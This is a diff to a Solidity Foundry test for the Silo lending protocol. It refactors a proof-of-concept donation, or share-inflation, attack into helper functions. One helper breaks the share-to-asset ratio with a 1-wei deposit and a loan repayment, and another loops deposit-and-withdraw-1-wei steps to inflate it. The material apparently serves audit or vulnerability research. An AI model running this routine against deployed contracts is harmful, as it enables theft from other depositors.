@@ -67,6 +67,34 @@ contract DepositTest is SiloLittleHelper, Test {
         address depositor = makeAddr("Depositor");
         address borrower = makeAddr("Borrower");
         ISiloConfig.ConfigData memory collateral = silo0.config().getConfig(address(silo0));
+
+        _prepareForTheAttack(depositor, borrower);
+
+        console.log("*** Borrow, repay interest and withdraw to break 1:1 share-to-asset ratio for donation attack preparation ***");
+        console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
+        console.log("silo0.getCollateralAssets(): ", silo0.getCollateralAssets());
+
+        console.log("*************");
+        console.log("*** Main attack starts now: ***");
+        
+        uint256 depositedForAttack = _doAttack(depositor, 10);
+        console.log("*** After 10 steps of deposit silo0.getCollateralAssets() -> withdraw 1 wei ***");
+        console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
+        console.log("silo0.getCollateralAssets(): ", silo0.getCollateralAssets());
+
+        depositedForAttack =  depositedForAttack + _doAttack(depositor, 10);
+        console.log("*** After +10 steps of deposit silo0.getCollateralAssets() -> withdraw 1 wei ***");
+        console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
+        console.log("silo0.getCollateralAssets(): ", silo0.getCollateralAssets());
+
+        depositedForAttack = depositedForAttack + _doAttack(depositor, 40);
+        console.log("*** After +40 (log2(10^18) < 60) steps of deposit silo0.getCollateralAssets() -> withdraw 1 wei ***");
+        console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
+        console.log("silo0.getCollateralAssets(): ", silo0.getCollateralAssets());
+    }
+
+    function _prepareForTheAttack(address _depositor, address _borrower) internal {
+        ISiloConfig.ConfigData memory collateral = silo0.config().getConfig(address(silo0));
         (,, address debtShareToken) = siloConfig.getShareTokens(address(silo0));
 
 
@@ -77,7 +105,7 @@ contract DepositTest is SiloLittleHelper, Test {
         assertEq(silo0.getCollateralAssets(), 0, "no assets deposited");
         uint256 one = 1;
 
-        _makeDeposit(silo0, token0, one, depositor, ISilo.CollateralType.Collateral);
+        _makeDeposit(silo0, token0, one, _depositor, ISilo.CollateralType.Collateral);
 
         console.log("*** 1 share 1 asset ***");
         console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
@@ -85,90 +113,24 @@ contract DepositTest is SiloLittleHelper, Test {
         assertEq(IShareToken(collateral.collateralShareToken).totalSupply(), one);
         assertEq(silo0.getCollateralAssets(), one);
 
-        _repayLoan(borrower, 200*one);
-        // console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
-        // console.log("silo0.getCollateralAssets(): ", silo0.getCollateralAssets());
-
-        (uint256 borrowerAssets) = silo0.maxWithdraw(borrower);
-        // console.log("borrowerAssets: ", borrowerAssets);
-
-        vm.prank(borrower);
-        silo0.withdraw(borrowerAssets, borrower, borrower);
+        _repayLoan(_borrower, 200*one);
+        (uint256 borrowerAssets) = silo0.maxWithdraw(_borrower);
+        vm.prank(_borrower);
+        silo0.withdraw(borrowerAssets, _borrower, _borrower);
         silo0.accrueInterest();
-        console.log("*** Repay interest and withdraw to break 1:1 share-to-asset ratio for donation attack preparation ***");
-        console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
-        console.log("silo0.getCollateralAssets(): ", silo0.getCollateralAssets());
+    }
 
-        _makeDeposit(silo0, token0, 5 * one, depositor, ISilo.CollateralType.Collateral);
-        vm.prank(depositor);
-        silo0.withdraw(5 * one, depositor, depositor);
-        _makeDeposit(silo0, token0, one, depositor, ISilo.CollateralType.Collateral);
-        
+    function _doAttack(address _depositor, uint _steps) internal returns (uint256 deposited) {
+        ISiloConfig.ConfigData memory collateral = silo0.config().getConfig(address(silo0));
 
-        _makeDeposit(silo0, token0, 11 * one, depositor, ISilo.CollateralType.Collateral);
-        vm.prank(depositor);
-        silo0.withdraw(11 * one, depositor, depositor);
+        for (uint i = 0; i < _steps; i++) {
+            uint toDeposit = silo0.getCollateralAssets();
+            _makeDeposit(silo0, token0, toDeposit, _depositor, ISilo.CollateralType.Collateral);
+            vm.prank(_depositor);
+            silo0.withdraw(1, _depositor, _depositor);
 
-        _makeDeposit(silo0, token0, 1 * one, depositor, ISilo.CollateralType.Collateral);
-
-
-        _makeDeposit(silo0, token0, 14 * one, depositor, ISilo.CollateralType.Collateral);
-        vm.prank(depositor);
-        silo0.withdraw(14 * one, depositor, depositor);
-
-        _makeDeposit(silo0, token0, 1 * one, depositor, ISilo.CollateralType.Collateral);
-
-        _makeDeposit(silo0, token0, (6*2+5) * one, depositor, ISilo.CollateralType.Collateral);
-        vm.prank(depositor);
-        silo0.withdraw((6*2+5) * one, depositor, depositor);
-
-        _makeDeposit(silo0, token0, 1 * one, depositor, ISilo.CollateralType.Collateral);
-
-
-        _makeDeposit(silo0, token0, (7*2+6) * one, depositor, ISilo.CollateralType.Collateral);
-        vm.prank(depositor);
-        silo0.withdraw((7*2+6) * one, depositor, depositor);
-        _makeDeposit(silo0, token0, 1 * one, depositor, ISilo.CollateralType.Collateral);
-
-        _makeDeposit(silo0, token0, (7) * one, depositor, ISilo.CollateralType.Collateral);
-        vm.prank(depositor);
-        silo0.withdraw((7) * one, depositor, depositor);
-        _makeDeposit(silo0, token0, 1 * one, depositor, ISilo.CollateralType.Collateral);
-
-        _makeDeposit(silo0, token0, (8) * one, depositor, ISilo.CollateralType.Collateral);
-        vm.prank(depositor);
-        silo0.withdraw((8) * one, depositor, depositor);
-        _makeDeposit(silo0, token0, 1 * one, depositor, ISilo.CollateralType.Collateral);
-
-        _makeDeposit(silo0, token0, (9) * one, depositor, ISilo.CollateralType.Collateral);
-        vm.prank(depositor);
-        silo0.withdraw((9) * one, depositor, depositor);
-        _makeDeposit(silo0, token0, 1 * one, depositor, ISilo.CollateralType.Collateral);
-
-        _makeDeposit(silo0, token0, (10) * one, depositor, ISilo.CollateralType.Collateral);
-        vm.prank(depositor);
-        silo0.withdraw((10) * one, depositor, depositor);
-        _makeDeposit(silo0, token0, 1 * one, depositor, ISilo.CollateralType.Collateral);
-        console.log("*** Make it 11:1 ratio***");
-
-        _makeDeposit(silo0, token0, 11 * one, depositor, ISilo.CollateralType.Collateral);
-        vm.prank(depositor);
-        silo0.withdraw(one, depositor, depositor);
-
-        _makeDeposit(silo0, token0, 21 * one, depositor, ISilo.CollateralType.Collateral);
-        vm.prank(depositor);
-        silo0.withdraw(one, depositor, depositor);
-
-        console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
-        console.log("silo0.getCollateralAssets(): ", silo0.getCollateralAssets());
-
-        // for (uint i = 0; i < 100; i++) {
-        //     _makeDeposit(silo0, token0, one, depositor, ISilo.CollateralType.Collateral);
-
-        //     console.log("For iteration ", i);
-        //     console.log("collateralShareToken.totalSupply() ", IShareToken(collateral.collateralShareToken).totalSupply());
-        //     console.log("silo0.getCollateralAssets() ", silo0.getCollateralAssets());
-        // }
+            deposited = deposited + toDeposit - 1;
+        }
     }
 
     function _repayLoan(address _borrower, uint _toBorrow) internal {
